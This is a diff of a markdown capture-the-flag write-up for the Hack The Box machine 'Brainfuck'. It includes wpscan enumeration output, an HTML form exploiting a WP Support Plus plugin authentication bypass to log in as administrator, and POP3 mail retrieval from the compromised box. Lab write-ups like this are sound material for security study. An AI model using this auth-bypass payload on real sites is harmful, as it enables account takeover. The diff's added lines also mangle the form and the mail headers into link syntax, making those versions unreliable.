@@ -85,7 +85,7 @@ root@kali:~/CTF/HTB/Boxes/Brainfuck# wpscan --url https://brainfuck.htb --disabl
  |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 
 [+] Enumerating Users (via Passive and Aggressive Methods)
- Brute Forcing Author IDs - Time: 00:00:03 <========================================> (10 / 10) 100.00% Time: 00:00:03
+ Brute Forcing Author IDs - Time: 00:00:03 [========================================](========================================) (10 / 10) 100.00% Time: 00:00:03
 
 [i] User(s) Identified:
 
@@ -109,12 +109,12 @@ So According to the exploit due to incorrect  usage of `wp_set_auth_cookie` we c
 
 ```html
 root@kali:~/CTF/HTB/Boxes/Brainfuck# cat ticket.html 
-<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
-	Username: <input type="text" name="username" value="administrator">
-	<input type="hidden" name="email" value="sth">
-	<input type="hidden" name="action" value="loginGuestFacebook">
-	<input type="submit" value="Login">
-</form>
+[form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php"](form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php")
+	Username: [input type="text" name="username" value="administrator"](input type="text" name="username" value="administrator")
+	[input type="hidden" name="email" value="sth"](input type="hidden" name="email" value="sth")
+	[input type="hidden" name="action" value="loginGuestFacebook"](input type="hidden" name="action" value="loginGuestFacebook")
+	[input type="submit" value="Login"](input type="submit" value="Login")
+[/form](/form)
 ```
 
 First I tried with `administrator` 
@@ -154,7 +154,7 @@ LIST
 .
 RETR 1
 +OK 977 octets
-Return-Path: <www-data@brainfuck.htb>
+Return-Path: [www-data@brainfuck.htb](www-data@brainfuck.htb)
 X-Original-To: orestis@brainfuck.htb
 Delivered-To: orestis@brainfuck.htb
 Received: by brainfuck (Postfix, from userid 33)
@@ -163,8 +163,8 @@ To: orestis@brainfuck.htb
 Subject: New WordPress Site
 X-PHP-Originating-Script: 33:class-phpmailer.php
 Date: Mon, 17 Apr 2017 17:15:40 +0000
-From: WordPress <wordpress@brainfuck.htb>
-Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
+From: WordPress [wordpress@brainfuck.htb](wordpress@brainfuck.htb)
+Message-ID: [00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb](00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb)
 X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
 MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
@@ -186,14 +186,14 @@ https://wordpress.org/
 .
 RETR 2
 +OK 514 octets
-Return-Path: <root@brainfuck.htb>
+Return-Path: [root@brainfuck.htb](root@brainfuck.htb)
 X-Original-To: orestis
 Delivered-To: orestis@brainfuck.htb
 Received: by brainfuck (Postfix, from userid 0)
 	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
 To: orestis@brainfuck.htb
 Subject: Forum Access Details
-Message-Id: <20170429101206.4227420AEB@brainfuck>
+Message-Id: [20170429101206.4227420AEB@brainfuck](20170429101206.4227420AEB@brainfuck)
 Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
 From: root@brainfuck.htb (root)
 
